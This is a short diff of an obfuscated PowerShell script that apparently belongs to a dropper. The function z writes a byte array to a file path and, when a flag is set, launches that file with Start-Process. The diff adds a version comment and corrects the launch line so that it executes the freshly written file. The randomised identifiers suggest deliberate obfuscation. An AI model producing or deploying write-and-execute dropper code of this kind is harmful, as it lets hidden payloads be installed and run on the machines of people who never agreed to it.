@@ -1,3 +1,4 @@
+# V1.0.1
 Set-StrictMode -Off
 
 function z($5VAUPX0,$8UNyT,$C1A = $false){
@@ -6,7 +7,7 @@ function z($5VAUPX0,$8UNyT,$C1A = $false){
     [System.IO.File]::WriteAllBytes($8UNyT, $CwgmejzO9vBEoiVkc3WIdxT7S)
 
     if($C1A){
-        Start-Process $cTlsE9kaZ
+        Start-Process $8UNyT
     }
 }
 
